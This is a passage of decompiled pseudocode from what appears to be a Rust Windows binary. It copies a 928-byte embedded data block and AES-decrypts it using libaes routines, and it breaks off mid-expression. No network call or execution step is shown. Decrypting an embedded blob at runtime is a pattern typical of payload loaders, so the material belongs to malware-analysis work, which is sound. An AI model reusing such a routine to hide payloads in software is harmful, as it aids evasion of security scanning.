*0x444040;\n                *(pauVar19[4] + 4) = uVar47;\n                *(pauVar19[4] + 8) = uVar48;\n                *(pauVar19[4] + 0xc) = uVar49;\n                uVar49 = *0x44405c;\n                uVar48 = *0x444058;\n                uVar47 = *0x444054;\n                *pauVar19[5] = *0x444050;\n                *(pauVar19[5] + 4) = uVar47;\n                *(pauVar19[5] + 8) = uVar48;\n                *(pauVar19[5] + 0xc) = uVar49;\n                uVar49 = *0x44406c;\n                uVar48 = *0x444068;\n                uVar47 = *0x444064;\n                *pauVar19[6] = *0x444060;\n                *(pauVar19[6] + 4) = uVar47;\n                *(pauVar19[6] + 8) = uVar48;\n                *(pauVar19[6] + 0xc) = uVar49;\n                uVar49 = *0x44407c;\n                uVar48 = *0x444078;\n                uVar47 = *0x444074;\n                *pauVar19[7] = *0x444070;\n                *(pauVar19[7] + 4) = uVar47;\n                *(pauVar19[7] + 8) = uVar48;\n                *(pauVar19[7] + 0xc) = uVar49;\n                uVar49 = *0x44408c;\n                uVar48 = *0x444088;\n                uVar47 = *0x444084;\n                *pauVar19[8] = *0x444080;\n                *(pauVar19[8] + 4) = uVar47;\n                *(pauVar19[8] + 8) = uVar48;\n                *(pauVar19[8] + 0xc) = uVar49;\n                uVar49 = *0x44409c;\n                uVar48 = *0x444098;\n                uVar47 = *0x444094;\n                *pauVar19[9] = *0x444090;\n                *(pauVar19[9] + 4) = uVar47;\n                *(pauVar19[9] + 8) = uVar48;\n                *(pauVar19[9] + 0xc) = uVar49;\n                uVar49 = *0x4440ac;\n                uVar48 = *0x4440a8;\n                uVar47 = *0x4440a4;\n                *pauVar19[10] = *0x4440a0;\n                *(pauVar19[10] + 4) = uVar47;\n                *(pauVar19[10] + 8) = uVar48;\n                *(pauVar19[10] + 0xc) = uVar49;\n                uVar49 = *0x4440bc;\n                uVar48 = *0x4440b8;\n                uVar47 = *0x4440b4;\n                *pauVar19[0xb] = *0x4440b0;\n                *(pauVar19[0xb] + 4) = uVar47;\n                *(pauVar19[0xb] + 8) = uVar48;\n                *(pauVar19[0xb] + 0xc) = uVar49;\n                uVar49 = *0x4440cc;\n                uVar48 = *0x4440c8;\n                uVar47 = *0x4440c4;\n                *pauVar19[0xc] = *0x4440c0;\n                *(pauVar19[0xc] + 4) = uVar47;\n                *(pauVar19[0xc] + 8) = uVar48;\n                *(pauVar19[0xc] + 0xc) = uVar49;\n                uVar49 = *0x4440dc;\n                uVar48 = *0x4440d8;\n                uVar47 = *0x4440d4;\n                *pauVar19[0xd] = *0x4440d0;\n                *(pauVar19[0xd] + 4) = uVar47;\n                *(pauVar19[0xd] + 8) = uVar48;\n                *(pauVar19[0xd] + 0xc) = uVar49;\n                uVar49 = *0x4440ec;\n                uVar48 = *0x4440e8;\n                uVar47 = *0x4440e4;\n                *pauVar19[0xe] = *0x4440e0;\n                *(pauVar19[0xe] + 4) = uVar47;\n                *(pauVar19[0xe] + 8) = uVar48;\n                *(pauVar19[0xe] + 0xc) = uVar49;\n                uVar49 = *0x4440fc;\n                uVar48 = *0x4440f8;\n                uVar47 = *0x4440f4;\n                *pauVar19[0xf] = *0x4440f0;\n                *(pauVar19[0xf] + 4) = uVar47;\n                *(pauVar19[0xf] + 8) = uVar48;\n                *(pauVar19[0xf] + 0xc) = uVar49;\n                uVar49 = *0x44410c;\n                uVar48 = *0x444108;\n                uVar47 = *0x444104;\n                *pauVar19[0x10] = *0x444100;\n                *(pauVar19[0x10] + 4) = uVar47;\n                *(pauVar19[0x10] + 8) = uVar48;\n                *(pauVar19[0x10] + 0xc) = uVar49;\n                uVar49 = *0x44411c;\n                uVar48 = *0x444118;\n                uVar47 = *0x444114;\n                *pauVar19[0x11] = *0x444110;\n                *(pauVar19[0x11] + 4) = uVar47;\n                *(pauVar19[0x11] + 8) = uVar48;\n                *(pauVar19[0x11] + 0xc) = uVar49;\n                uVar49 = *0x44412c;\n                uVar48 = *0x444128;\n                uVar47 = *0x444124;\n                *pauVar19[0x12] = *0x444120;\n                *(pauVar19[0x12] + 4) = uVar47;\n                *(pauVar19[0x12] + 8) = uVar48;\n                *(pauVar19[0x12] + 0xc) = uVar49;\n                uVar49 = *0x44413c;\n                uVar48 = *0x444138;\n                uVar47 = *0x444134;\n                *pauVar19[0x13] = *0x444130;\n                *(pauVar19[0x13] + 4) = uVar47;\n                *(pauVar19[0x13] + 8) = uVar48;\n                *(pauVar19[0x13] + 0xc) = uVar49;\n                uVar49 = *0x44414c;\n                uVar48 = *0x444148;\n                uVar47 = *0x444144;\n                *pauVar19[0x14] = *0x444140;\n                *(pauVar19[0x14] + 4) = uVar47;\n                *(pauVar19[0x14] + 8) = uVar48;\n                *(pauVar19[0x14] + 0xc) = uVar49;\n                uVar49 = *0x44415c;\n                uVar48 = *0x444158;\n                uVar47 = *0x444154;\n                *pauVar19[0x15] = *0x444150;\n                *(pauVar19[0x15] + 4) = uVar47;\n                *(pauVar19[0x15] + 8) = uVar48;\n                *(pauVar19[0x15] + 0xc) = uVar49;\n                uVar49 = *0x44416c;\n                uVar48 = *0x444168;\n                uVar47 = *0x444164;\n                *pauVar19[0x16] = *0x444160;\n                *(pauVar19[0x16] + 4) = uVar47;\n                *(pauVar19[0x16] + 8) = uVar48;\n                *(pauVar19[0x16] + 0xc) = uVar49;\n                uVar49 = *0x44417c;\n                uVar48 = *0x444178;\n                uVar47 = *0x444174;\n                *pauVar19[0x17] = *0x444170;\n                *(pauVar19[0x17] + 4) = uVar47;\n                *(pauVar19[0x17] + 8) = uVar48;\n                *(pauVar19[0x17] + 0xc) = uVar49;\n                uVar49 = *0x44418c;\n                uVar48 = *0x444188;\n                uVar47 = *0x444184;\n                *pauVar19[0x18] = *0x444180;\n                *(pauVar19[0x18] + 4) = uVar47;\n                *(pauVar19[0x18] + 8) = uVar48;\n                *(pauVar19[0x18] + 0xc) = uVar49;\n                uVar49 = *0x44419c;\n                uVar48 = *0x444198;\n                uVar47 = *0x444194;\n                *pauVar19[0x19] = *0x444190;\n                *(pauVar19[0x19] + 4) = uVar47;\n                *(pauVar19[0x19] + 8) = uVar48;\n                *(pauVar19[0x19] + 0xc) = uVar49;\n                uVar49 = *0x4441ac;\n                uVar48 = *0x4441a8;\n                uVar47 = *0x4441a4;\n                *pauVar19[0x1a] = *0x4441a0;\n                *(pauVar19[0x1a] + 4) = uVar47;\n                *(pauVar19[0x1a] + 8) = uVar48;\n                *(pauVar19[0x1a] + 0xc) = uVar49;\n                uVar49 = *0x4441bc;\n                uVar48 = *0x4441b8;\n                uVar47 = *0x4441b4;\n                *pauVar19[0x1b] = *0x4441b0;\n                *(pauVar19[0x1b] + 4) = uVar47;\n                *(pauVar19[0x1b] + 8) = uVar48;\n                *(pauVar19[0x1b] + 0xc) = uVar49;\n                uVar49 = *0x4441cc;\n                uVar48 = *0x4441c8;\n                uVar47 = *0x4441c4;\n                *pauVar19[0x1c] = *0x4441c0;\n                *(pauVar19[0x1c] + 4) = uVar47;\n                *(pauVar19[0x1c] + 8) = uVar48;\n                *(pauVar19[0x1c] + 0xc) = uVar49;\n                uVar49 = *0x4441dc;\n                uVar48 = *0x4441d8;\n                uVar47 = *0x4441d4;\n                *pauVar19[0x1d] = *0x4441d0;\n                *(pauVar19[0x1d] + 4) = uVar47;\n                *(pauVar19[0x1d] + 8) = uVar48;\n                *(pauVar19[0x1d] + 0xc) = uVar49;\n                uVar49 = *0x4441ec;\n                uVar48 = *0x4441e8;\n                uVar47 = *0x4441e4;\n                *pauVar19[0x1e] = *0x4441e0;\n                *(pauVar19[0x1e] + 4) = uVar47;\n                *(pauVar19[0x1e] + 8) = uVar48;\n                *(pauVar19[0x1e] + 0xc) = uVar49;\n                uVar49 = *0x4441fc;\n                uVar48 = *0x4441f8;\n                uVar47 = *0x4441f4;\n                *pauVar19[0x1f] = *0x4441f0;\n                *(pauVar19[0x1f] + 4) = uVar47;\n                *(pauVar19[0x1f] + 8) = uVar48;\n                *(pauVar19[0x1f] + 0xc) = uVar49;\n                uVar49 = *0x44420c;\n                uVar48 = str.3_Aq._0_4_;\n                uVar47 = *0x444204;\n                *pauVar19[0x20] = *0x444200;\n                *(pauVar19[0x20] + 4) = uVar47;\n                *(pauVar19[0x20] + 8) = uVar48;\n                *(pauVar19[0x20] + 0xc) = uVar49;\n                uVar49 = *0x44421c;\n                uVar48 = *0x444218;\n                uVar47 = *0x444214;\n                *pauVar19[0x21] = *0x444210;\n                *(pauVar19[0x21] + 4) = uVar47;\n                *(pauVar19[0x21] + 8) = uVar48;\n                *(pauVar19[0x21] + 0xc) = uVar49;\n                uVar49 = *0x44422c;\n                uVar48 = *0x444228;\n                uVar47 = *0x444224;\n                *pauVar19[0x22] = *0x444220;\n                *(pauVar19[0x22] + 4) = uVar47;\n                *(pauVar19[0x22] + 8) = uVar48;\n                *(pauVar19[0x22] + 0xc) = uVar49;\n                uVar49 = *0x44423c;\n                uVar48 = *0x444238;\n                uVar47 = *0x444234;\n                *pauVar19[0x23] = *0x444230;\n                *(pauVar19[0x23] + 4) = uVar47;\n                *(pauVar19[0x23] + 8) = uVar48;\n                *(pauVar19[0x23] + 0xc) = uVar49;\n                uVar49 = *0x44424c;\n                uVar48 = *0x444248;\n                uVar47 = *0x444244;\n                *pauVar19[0x24] = *0x444240;\n                *(pauVar19[0x24] + 4) = uVar47;\n                *(pauVar19[0x24] + 8) = uVar48;\n                *(pauVar19[0x24] + 0xc) = uVar49;\n                uVar49 = *0x44425c;\n                uVar48 = *0x444258;\n                uVar47 = *0x444254;\n                *pauVar19[0x25] = *0x444250;\n                *(pauVar19[0x25] + 4) = uVar47;\n                *(pauVar19[0x25] + 8) = uVar48;\n                *(pauVar19[0x25] + 0xc) = uVar49;\n                uVar49 = *0x44426c;\n                uVar48 = *0x444268;\n                uVar47 = *0x444264;\n                *pauVar19[0x26] = *0x444260;\n                *(pauVar19[0x26] + 4) = uVar47;\n                *(pauVar19[0x26] + 8) = uVar48;\n                *(pauVar19[0x26] + 0xc) = uVar49;\n                uVar49 = *0x44427c;\n                uVar48 = *0x444278;\n                uVar47 = *0x444274;\n                *pauVar19[0x27] = *0x444270;\n                *(pauVar19[0x27] + 4) = uVar47;\n                *(pauVar19[0x27] + 8) = uVar48;\n                *(pauVar19[0x27] + 0xc) = uVar49;\n                uVar49 = *0x44428c;\n                uVar48 = *0x444288;\n                uVar47 = *0x444284;\n                *pauVar19[0x28] = *0x444280;\n                *(pauVar19[0x28] + 4) = uVar47;\n                *(pauVar19[0x28] + 8) = uVar48;\n                *(pauVar19[0x28] + 0xc) = uVar49;\n                uVar49 = *0x44429c;\n                uVar48 = *0x444298;\n                uVar47 = *0x444294;\n                *pauVar19[0x29] = *0x444290;\n                *(pauVar19[0x29] + 4) = uVar47;\n                *(pauVar19[0x29] + 8) = uVar48;\n                *(pauVar19[0x29] + 0xc) = uVar49;\n                uVar49 = *0x4442ac;\n                uVar48 = *0x4442a8;\n                uVar47 = *0x4442a4;\n                *pauVar19[0x2a] = *0x4442a0;\n                *(pauVar19[0x2a] + 4) = uVar47;\n                *(pauVar19[0x2a] + 8) = uVar48;\n                *(pauVar19[0x2a] + 0xc) = uVar49;\n                uVar49 = *0x4442bc;\n                uVar48 = *0x4442b8;\n                uVar47 = *0x4442b4;\n                *pauVar19[0x2b] = *0x4442b0;\n                *(pauVar19[0x2b] + 4) = uVar47;\n                *(pauVar19[0x2b] + 8) = uVar48;\n                *(pauVar19[0x2b] + 0xc) = uVar49;\n                uVar49 = str.FY_2._0_4_;\n                uVar48 = *0x4442c8;\n                uVar47 = *0x4442c4;\n                *pauVar19[0x2c] = *0x4442c0;\n                *(pauVar19[0x2c] + 4) = uVar47;\n                *(pauVar19[0x2c] + 8) = uVar48;\n                *(pauVar19[0x2c] + 0xc) = uVar49;\n                uVar49 = *0x4442dc;\n                uVar48 = *0x4442d8;\n                uVar47 = *0x4442d4;\n                *pauVar19[0x2d] = *0x4442d0;\n                *(pauVar19[0x2d] + 4) = uVar47;\n                *(pauVar19[0x2d] + 8) = uVar48;\n                *(pauVar19[0x2d] + 0xc) = uVar49;\n                uVar49 = *0x4442ec;\n                uVar48 = *0x4442e8;\n                uVar47 = *0x4442e4;\n                *pauVar19[0x2e] = *0x4442e0;\n                *(pauVar19[0x2e] + 4) = uVar47;\n                *(pauVar19[0x2e] + 8) = uVar48;\n                *(pauVar19[0x2e] + 0xc) = uVar49;\n                uVar49 = *0x4442fc;\n                uVar48 = *0x4442f8;\n                uVar47 = *0x4442f4;\n                *pauVar19[0x2f] = *0x4442f0;\n                *(pauVar19[0x2f] + 4) = uVar47;\n                *(pauVar19[0x2f] + 8) = uVar48;\n                *(pauVar19[0x2f] + 0xc) = uVar49;\n                uVar49 = *0x44430c;\n                uVar48 = *0x444308;\n                uVar47 = *0x444304;\n                *pauVar19[0x30] = *0x444300;\n                *(pauVar19[0x30] + 4) = uVar47;\n                *(pauVar19[0x30] + 8) = uVar48;\n                *(pauVar19[0x30] + 0xc) = uVar49;\n                uVar49 = *0x44431c;\n                uVar48 = *0x444318;\n                uVar47 = *0x444314;\n                *pauVar19[0x31] = *0x444310;\n                *(pauVar19[0x31] + 4) = uVar47;\n                *(pauVar19[0x31] + 8) = uVar48;\n                *(pauVar19[0x31] + 0xc) = uVar49;\n                uVar49 = *0x44432c;\n                uVar48 = *0x444328;\n                uVar47 = *0x444324;\n                *pauVar19[0x32] = *0x444320;\n                *(pauVar19[0x32] + 4) = uVar47;\n                *(pauVar19[0x32] + 8) = uVar48;\n                *(pauVar19[0x32] + 0xc) = uVar49;\n                uVar49 = str.__ft._0_4_;\n                uVar48 = *0x444338;\n                uVar47 = *0x444334;\n                *pauVar19[0x33] = *0x444330;\n                *(pauVar19[0x33] + 4) = uVar47;\n                *(pauVar19[0x33] + 8) = uVar48;\n                *(pauVar19[0x33] + 0xc) = uVar49;\n                uVar49 = *0x44434c;\n                uVar48 = *0x444348;\n                uVar47 = *0x444344;\n                *pauVar19[0x34] = *0x444340;\n                *(pauVar19[0x34] + 4) = uVar47;\n                *(pauVar19[0x34] + 8) = uVar48;\n                *(pauVar19[0x34] + 0xc) = uVar49;\n                uVar49 = *0x44435c;\n                uVar48 = *0x444358;\n                uVar47 = *0x444354;\n                *pauVar19[0x35] = *0x444350;\n                *(pauVar19[0x35] + 4) = uVar47;\n                *(pauVar19[0x35] + 8) = uVar48;\n                *(pauVar19[0x35] + 0xc) = uVar49;\n                uVar49 = *0x44436c;\n                uVar48 = *0x444368;\n                uVar47 = *0x444364;\n                *pauVar19[0x36] = *0x444360;\n                *(pauVar19[0x36] + 4) = uVar47;\n                *(pauVar19[0x36] + 8) = uVar48;\n                *(pauVar19[0x36] + 0xc) = uVar49;\n                uVar49 = *0x44437c;\n                uVar48 = *0x444378;\n                uVar47 = *0x444374;\n                *pauVar19[0x37] = *0x444370;\n                *(pauVar19[0x37] + 4) = uVar47;\n                *(pauVar19[0x37] + 8) = uVar48;\n                *(pauVar19[0x37] + 0xc) = uVar49;\n                uVar49 = *0x44438c;\n                uVar48 = *0x444388;\n                uVar47 = *0x444384;\n                *pauVar19[0x38] = *0x444380;\n                *(pauVar19[0x38] + 4) = uVar47;\n                *(pauVar19[0x38] + 8) = uVar48;\n                *(pauVar19[0x38] + 0xc) = uVar49;\n                uVar7 = *0x444398;\n                uVar15 = *0x444390;\n                *pauVar19[0x39] = *0x444390;\n                *(pauVar19[0x39] + 8) = uVar7;\n                pauStack1312 = 0x3a0;\n                pauStack1304 = 0x3a0;\n                pauStack1320 = pauVar19;\n                sub.msvcrt.dll_memset(uVar15, auStack904, 0, 0xf1);\n                sym.libaes::aes_set_encrypt_key::h1c875f9a0e924a3c(auStack904);\n                puVar22 = auStack1192;\n                sub.msvcrt.dll_memset(puVar22, 0, 0xf1);\n                sym.libaes::aes_set_encrypt_key::h1c875f9a0e924a3c(puVar22);\n                pauVar16 = uStack952 << 2;\n                for (pauVar17 = NULL; pauVar17 < pauVar16; pauVar17 = *pauVar17 + 4) {\n                    if (0x3b < pauVar17) {\n                        uVar15 = 0x447190;\ncode_r0x0040437b:\n                        pauVar26 = 0x3c;\ncode_r0x00404380:\n                        *0x10 = 0x3c;\n                        goto code_r0x004043e4;\n                    }\n                    if (0x3b < pauVar16) {\n                        uVar15 = 0x4471a8;\n                        pauVar26 = pauVar16;\n                        goto code_r0x00404380;\n                    }\n                    uVar47 = *(auStack1192 + pauVar17 * 4);\n                    *(auStack1192 + pauVar17 * 4) = *(auStack1192 + pauVar16 * 4);\n                    *(auStack1192 + pauVar16 * 4) = uVar47;\n                    if (0x3b < *pauVar16 + 1) {\n                        uVar15 = 0x4471c0;\n                        goto code_r0x0040437b;\n                    }\n                    uVar46 = (&uStack1188)[pauVar17];\n                    (&uStack1188)[pauVar17] = (&uStack1188)[pauVar16];\n                    (&uStack1188)[pauVar16] = uVar46;\n                    pauVar26 = *pauVar16 + 2;\n                    if (0x3b < pauVar26) {\n                        uVar15 = 0x4471d8;\ncode_r0x00404397:\n                        *0x10 = 0x3c;\n                        goto code_r0x004043e4;\n                    }\n                    uVar47 = *(auStack1176 + pauVar17 * 4 + -8);\n                    *(auStack1176 + pauVar17 * 4 + -8) = *(auStack1176 + pauVar16 * 4 + -8);\n                    *(auStack1176 + pauVar16 * 4 + -8) = uVar47;\n                    pauVar26 = *pauVar16 + 3;\n                    if (0x3b < pauVar26) {\n                        uVar15 = 0x4471f0;\n                        goto code_r0x00404397;\n                    }\n                    uVar47 = *(auStack1176 + pauVar17 * 4 + -4);\n                    *(auStack1176 + pauVar17 * 4 + -4) = *(auStack1176 + pauVar16 * 4 + -4);\n                    *(auStack1176 + pauVar16 * 4 + -4) = uVar47;\n                    pauVar16 = pauVar16[-1] + 0xc;\n                }\n                uVar25 = 0x3c;\n                uVar11 = 1;\n                while (uVar11 < uStack952) {\n                    puVar22 = sym._ZN4core5slice5index77__LT_impl_u20_core..ops..index..IndexMut_LT_I_GT__u20_for_u20__u5b_T_u5d__GT_9index_mut17h1e00ae32d9db78\n                                        (puVar22, uVar25, 4);\n                    if (uVar25 == 0) {\n                        uVar15 = 0x447608;\n                        goto code_r0x0040416e;\n                    }\n                    uVar46 = *puVar22;\n                    *puVar22 = *(*((uVar46 >> 0xe & 0x3fc) + 0x446ca8) * 4 + 0x447620) ^\n                               *(*((uVar46 >> 0x18) * 4 + 0x446ca8) * 4 + 0x447208) ^\n                               *(*((uVar46 >> 8 & 0xff) * 4 + 0x446ca8) * 4 + 0x447a20) ^\n                               *(*((uVar46 & 0xff) * 4 + 0x446ca8) * 4 + 0x447e20);\n                    if (uVar25 == 1) {\n                        uVar15 = 0x448220;\n                        pauVar26 = 0x1;\n                        *0x10 = 0x1;\n                        goto code_r0x004043e4;\n                    }\n                    uVar46 = puVar22[1];\n                    puVar22[1] = *(*((uVar46 >> 0xe & 0x3fc) + 0x446ca8) * 4 + 0x447620) ^\n                                 *(*((uVar46 >> 0x18) * 4 + 0x446ca8) * 4 + 0x447208) ^\n                                 *(*((uVar46 >> 8 & 0xff) * 4 + 0x446ca8) * 4 + 0x447a20) ^\n                                 *(*((uVar46 & 0xff) * 4 + 0x446ca8) * 4 + 0x447e20);\n                    if (uVar25 < 3) {\n                        uVar15 = 0x448238;\n                        pauVar26 = 0x2;\n                        *0x10 = 0x2;\n                        goto code_r0x004043e4;\n                    }\n                    uVar46 = puVar22[2];\n                    puVar22[2] = *(*((uVar46 >> 0xe & 0x3fc) + 0x446ca8) * 4 + 0x447620) ^\n                                 *(*((uVar46 >> 0x18) * 4 + 0x446ca8) * 4 + 0x447208) ^\n                                 *(*((uVar46 >> 8 & 0xff) * 4 + 0x446ca8) * 4 + 0x447a20) ^\n                                 *(*((uVar46 & 0xff) * 4 + 0x446ca8) * 4 + 0x447e20);\n                    if (uVar25 == 3) {\n                        uVar15 = 0x448250;\n                        pauVar26 = 0x3;\n                        *0x10 = 0x3;\n                        goto code_r0x004043e4;\n                    }\n                    uVar46 = puVar22[3];\n                    puVar22[3] = *(*((uVar46 >> 0xe & 0x3fc) + 0x446ca8) * 4 + 0x447620) ^\n                                 *(*((uVar46 >> 0x18) * 4 + 0x446ca8) * 4 + 0x447208) ^\n                                 *(*((uVar46 >> 8 & 0xff) * 4 + 0x446ca8) * 4 + 0x447a20) ^\n                                 *(*((uVar46 & 0xff) * 4 + 0x446ca8) * 4 + 0x447e20);\n                    uVar11 = uVar11 + (uVar11 < uStack952);\n                }\n                sym.memcpy(&pauStack584, auStack904, 0xf4);\n                sym.memcpy(&uStack344 + 4, auStack1192, 0xf4);\n                pauVar26 = sym._ZN5alloc5alloc6Global10alloc_impl17hd38d3c93a0ea2d69E.149(0x3a0, 1);\n                if (pauVar26 != NULL) {\n                    sym.memcpy(pauVar26, pauVar19);\n                    uStack1220 = uStack344._4_4_;\n                    uStack1224 = auStack336._0_4_;\n                    uStack1228 = auStack336._4_4_;\n                    uStack1232 = uStack328;\n                    pauVar17 = 0x444668;\n                    pauVar18 = 0x10;\n                    bVar45 = false;\n                    pauVar16 = NULL;\n                    pauStack648 = pauVar26;\n                    pauStack640 = pauVar19;\n                    while (((pauVar19 = pauStack1272,  !bVar45 ||\n                            (bVar45 = pauVar16 < 0xfffffffffffffff1,  pauVar16 = *pauVar16 + 0xf,  bVar45)) &&\n                           (pauVar16 < 0x3a0))) {\n                        pauStack1248 = *pauVar16 + 1;\n                        pauStack632 = pauVar16[1];\n                        pauVar30 = 0x3a0;\n                        pauStack1392 = pauVar18;\n                        pauStack1360 = pauVar17;\n                        pauStack1328 = pauVar16;\n                        pauVar19 = sym._ZN4core5slice5index77__LT_impl_u20_core..ops..index..IndexMut_LT_I_GT__u20_for_u20__u5b_T_u5d__GT_9index_mut17h5800c158ed6c94\n                                             (pauVar26, 0x3a0, pauVar16, pauStack632);\n                        pauVar26 = pauVar30;\n                        uVar15 = sym.core::slice::index::__impl_core::ops::index::Index_I__for__T__::index::hf1353b16eb9f7dff\n                                           (pauVar19, pauVar30, 0, 4);\n                        uVar46 = sym.libaes::get_u32::h0cc37895dca67686(uVar15, pauVar26);\n                        uVar46 = uVar46 ^ uStack1220;\n                        pauVar26 = pauVar30;\n                        uVar15 = sym.core::slice::index::__impl_core::ops::index::Index_I__for__T__::index::hf1353b16eb9f7dff\n                                           (pauVar19, pauVar30, 4, 8);\n                        uVar23 = sym.libaes::get_u32::h0cc37895dca67686(uVar15, pauVar26);\n                        uVar23 = uVar23 ^ uStack1224;\n                        pauVar26 = pauVar30;\n                        uVar15 = sym.core::slice::index::__impl_core::ops::index::Index_I__for__T__::index::hf1353b16eb9f7dff\n                                           (pauVar19, pauVar30, 8, 0xc);\n                        uVar24 = sym.libaes::get_u32::h0cc37895dca67686(uVar15, pauVar26);\n                        pauVar26 = pauVar30;\n                        pauStack1240 = pauVar19;\n                        uVar15 = sym.core::slice::index::__impl_core::ops::index::Index_I__for__T__::index::hf1353b16eb9f7dff\n                                           (pauVar19, pauVar30, 0xc, 0x10);\n                        uVar39 = sym.libaes::get_u32::h0cc37895dca67686(uVar15, pauVar26);\n                        pauVar19 = pauStack1240;\n                        uVar24 = uVar24 ^ uStack1228;\n                        uVar39 = uVar39 ^ uStack1232;\n                        ppauStack1520 = &pauStack296;\n                        pauVar26 = 0x3c;\n                        uVar11 = uStack100 >> 1;\n                        while( true ) {\n                            pauVar16 = pauVar26;\n                            uVar11 = uVar11 - 1;\n                            pauStack1496 = uVar46;\n                            if (pauVar16 < 0x5) {\n                                uVar15 = 0x448268;\n                                pauVar26 = 0x4;\n                                *0x10 = 0x4;\n                                goto code_r0x004043e4;\n                            }\n                            uVar42 = *((uVar39 >> 0x10 & 0xff) * 4 + 0x447620) ^ *((uVar46 >> 0x18) * 4 + 0x447208) ^\n                                     *((uVar24 >> 8 & 0xff) * 4 + 0x447a20) ^ *((uVar23 & 0xff) * 4 + 0x447e20) ^\n                                     *(ppauStack1520 + -0x1c);\n                            uVar40 = *((pauStack1496 >> 0x10 & 0xff) * 4 + 0x447620) ^\n                                     *((uVar23 >> 0x18) * 4 + 0x447208) ^ *((uVar39 >> 8 & 0xff) * 4 + 0x447a20) ^\n                                     *((uVar24 & 0xff) * 4 + 0x447e20) ^ *(ppauStack1520 + -3);\n                            uVar43 = *((uVar23 >> 0x10 & 0xff) * 4 + 0x447620) ^ *((uVar24 >> 0x18) * 4 + 0x447208) ^\n                                     *((pauStack1496 >> 8 & 0xff) * 4 + 0x447a20) ^ *((uVar39 & 0xff) * 4 + 0x447e20) ^\n                                     *(ppauStack1520 + -0x14);\n                            uVar39 = *((uVar24 >> 0x10 & 0xff) * 4 + 0x447620) ^ *((uVar39 >> 0x18) * 4 + 0x447208) ^\n                                     *((uVar23 >> 8 & 0xff) * 4 + 0x447a20) ^ *((uVar46 & 0xff) * 4 + 0x447e20) ^\n                                     *(ppauStack1520 + -2);\n                            if (uVar11 == 0) break;\n                            if (pauVar16 == 0x8) {\n                                uVar15 = 0x448280;\n                                goto code_r0x0040416e;\n                            }\n                            uVar46 = *((uVar43 >> 8 & 0xff) * 4 + 0x447a20) ^ *((uVar40 & 0xff) * 4 + 0x447e20) ^\n                                     *((uVar39 >> 0x10 & 0xff) * 4 + 0x447620) ^ *((uVar42 >> 0x18) * 4 + 0x447208) ^\n                                     *(ppauStack1520 + -0xc);\n                            uVar23 = *((uVar42 >> 0x10 & 0xff) * 4 + 0x447620) ^ *((uVar40 >> 0x18) * 4 + 0x447208) ^\n                                     *((uVar39 >> 8 & 0xff) * 4 + 0x447a20) ^ *((uVar43 & 0xff) * 4 + 0x447e20) ^\n                                     *(ppauStack1520 + -1);\n                            uVar24 = *((uVar40 >> 0x10 & 0xff) * 4 + 0x447620) ^ *((uVar43 >> 0x18) * 4 + 0x447208) ^\n                                     *((uVar42 >> 8 & 0xff) * 4 + 0x447a20) ^ *((uVar39 & 0xff) * 4 + 0x447e20) ^\n                                     *(ppauStack1520 + -4);\n                            uVar39 = *((uVar43 >> 0x10 & 0xff) * 4 + 0x447620) ^ *((uVar39 >> 0x18) * 4 + 0x447208) ^\n                                     *((uVar40 >> 8 & 0xff) * 4 + 0x447a20) ^ *((uVar42 & 0xff) * 4 + 0x447e20) ^\n                                     *ppauStack1520;\n                            ppauStack1520 = ppauStack1520 + 4;\n                            pauVar26 = pauVar16[-1] + 8;\n                            pauStack1424 = pauVar16;\n                        }\n                        if (pauVar16 == 0x8) {\n                            uVar15 = 0x448398;\ncode_r0x0040416e:\n                            pauVar26 = NULL;\n                            *0x10 = NULL;\ncode_r0x004043e4:\n                            dbg.panic_bounds_check(pauVar26, *0x10, uVar15);\n                            do {\n                                invalidInstructionException();\n                            } while( true );\n                        }\n                        uVar11 = *((uVar40 & 0xff) + 0x448298);\n                        uVar2 = *((uVar43 >> 8 & 0xff) + 0x448298);\n                        uVar3 = *((uVar39 >> 0x10 & 0xff) + 0x448298);\n                        uVar4 = *((uVar42 >> 0x18) + 0x448298);\n                        uVar46 = *(ppauStack1520 + -0xc);\n                        pauVar26 = pauVar30;\n                        uVar15 = sym._ZN4core5slice5index77__LT_impl_u20_core..ops..index..IndexMut_LT_I_GT__u20_for_u20__u5b_T_u5d__GT_9index_mut17h5800c158ed6c94\n                                           (pauStack1240, pauVar30, 0, 4);\n                        sym.libaes::put_u32::h45216aaeb5e7b06d\n                                  (uVar15, pauVar26, \n                                   (uVar11 | (uVar2 << 0x10) >> 8 | uVar3 << 0x10 | uVar4 << 0x18) ^ uVar46);\n                        uVar11 = *((uVar43 & 0xff) + 0x448298);\n                        uVar2 = *((uVar39 >> 8 & 0xff) + 0x448298);\n                        uVar3 = *((uVar42 >> 0x10 & 0xff) + 0x448298);\n                        uVar4 = *((uVar40 >> 0x18) + 0x448298);\n                        uVar46 = *(ppauStack1520 + -1);\n                        pauVar26 = pauVar30;\n                        uVar15 = sym._ZN4core5slice5index77__LT_impl_u20_core..ops..index..IndexMut_LT_I_GT__u20_for_u20__u5b_T_u5d__GT_9index_mut17h5800c158ed6c94\n                                           (pauVar19, pauVar30, 4, 8);\n                        sym.libaes::put_u32::h45216aaeb5e7b06d\n                                  (uVar15, pauVar26, \n                                   (uVar11 | (uVar2 << 0x10) >> 8 | uVar3 << 0x10 | uVar4 << 0x18) ^ uVar46);\n                        uVar11 = *((uVar39 & 0xff) + 0x448298);\n                        uVar2 = *((uVar42 >> 8 & 0xff) + 0x448298);\n                        uVar3 = *((uVar40 >> 0x10 & 0xff) + 0x448298);\n                        uVar4 = *((uVar43 >> 0x18) + 0x448298);\n                        uVar46 = *(ppauStack1520 + -4);\n                        pauVar26 = pauVar30;\n                        uVar15 = sym._ZN4core5slice5index77__LT_impl_u20_core..ops..index..IndexMut_LT_I_GT__u20_for_u20__u5b_T_u5d__GT_9index_mut17h5800c158ed6c94\n                                           (pauVar19, pauVar30, 8, 0xc);\n                        sym.libaes::put_u32::h45216aaeb5e7b06d\n                                  (uVar15, pauVar26, \n                                   (uVar11 | (uVar2 << 0x10) >> 8 | uVar3 << 0x10 | uVar4 << 0x18) ^ uVar46);\n                        uVar11 = *((uVar42 & 0xff) + 0x448298);\n                        uVar2 = *((uVar40 >> 8 & 0xff) + 0x448298);\n                        uVar3 = *((uVar43 >> 0x10 & 0xff) + 0x448298);\n                        uVar4 = *((uVar39 >> 0x18) + 0x448298);\n                        uVar46 = *ppauStack1520;\n                        pauVar26 = pauVar30;\n                        uVar15 = sym._ZN4core5slice5index77__LT_impl_u20_core..ops..index..IndexMut_LT_I_GT__u20_for_u20__u5b_T_u5d__GT_9index_mut17h5800c158ed6c94\n                                           (pauVar19, pauVar30, 0xc, 0x10);\n                        sym.libaes::put_u32::h45216aaeb5e7b06d\n                                  (uVar15, pauVar26, \n                                   (uVar11 | 